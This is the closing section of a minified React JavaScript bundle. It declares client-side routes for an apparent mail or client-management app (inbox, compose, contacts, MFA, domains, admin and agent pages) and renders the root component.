              (0, R.jsx)(Lt, { path: `/inbox`, element: (0, R.jsx)(Ao, {}) }),
              (0, R.jsx)(Lt, { path: `/compose`, element: (0, R.jsx)(Rs, {}) }),
              (0, R.jsx)(Lt, {
                path: `/contacts`,
                element: (0, R.jsx)(ys, {}),
              }),
              (0, R.jsx)(Lt, { path: `/mfa`, element: (0, R.jsx)(tc, {}) }),
              (0, R.jsx)(Lt, {
                path: `/keywords`,
                element: (0, R.jsx)(Lo, {}),
              }),
              (0, R.jsx)(Lt, { path: `/ai`, element: (0, R.jsx)(Fa, {}) }),
              (0, R.jsx)(Lt, { path: `/domains`, element: (0, R.jsx)(Zo, {}) }),
              (0, R.jsx)(Lt, {
                path: `/admin`,
                element: (0, R.jsx)(qc, { children: (0, R.jsx)(Tc, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `/admin/clients`,
                element: (0, R.jsx)(qc, { children: (0, R.jsx)(Ec, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `/admin/agents`,
                element: (0, R.jsx)(qc, { children: (0, R.jsx)(Ac, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `/agent`,
                element: (0, R.jsx)(Jc, { children: (0, R.jsx)(lc, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `/agent/clients`,
                element: (0, R.jsx)(Jc, { children: (0, R.jsx)(uc, {}) }),
              }),
              (0, R.jsx)(Lt, {
                path: `*`,
                element: (0, R.jsx)(Ft, { to: `/`, replace: !0 }),
              }),
            ],
          }),
        ],
      }),
    })
  );
}
(0, v.createRoot)(document.getElementById(`root`)).render(
  (0, R.jsx)(_.StrictMode, { children: (0, R.jsx)(Yc, {}) }),
);
